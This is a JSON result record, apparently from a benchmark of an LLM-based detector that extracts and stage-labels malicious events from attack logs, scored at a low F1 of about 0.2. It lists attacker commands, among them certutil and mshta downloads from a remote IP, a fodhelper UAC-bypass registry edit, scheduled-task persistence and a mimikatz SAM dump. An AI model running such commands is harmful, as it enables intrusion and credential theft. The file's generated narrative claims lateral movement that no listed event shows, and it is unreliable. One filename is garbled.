@@ -1,0 +1,108 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"HKCU\\software\\classes\\ms-settings\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "fodhelper.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\verifierdlls /v verifierdlls /d 1 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "nltest /domain_trusts",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attacker has performed reconnaissance to understand the environment (Discovery), established persistence (scheduled tasks, modified run keys), escalated privileges (modified image file execution options), and accessed credentials (with Mimikatz). They executed malicious payloads using PowerShell, certutil, mshta, and schtasks, demonstrating both lateral movement and collection of sensitive information.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 164834,
+      "completion_tokens": 5737,
+      "total_tokens": 170571,
+      "wall_clock_s": 79.826,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.14705882352941177,
+      "f1": 0.20833333333333334,
+      "tp": 5,
+      "fp": 9,
+      "fn": 29
+    },
+    "stage": {
+      "precision": 0.35714285714285715,
+      "recall": 0.1388888888888889,
+      "f1": 0.2,
+      "tp": 5,
+      "fp": 9,
+      "fn": 31,
+      "recall_partial": 0.1891891891891892
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 164834,
+      "completion_tokens": 5737,
+      "total_tokens": 170571,
+      "wall_clock_s": 79.826,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
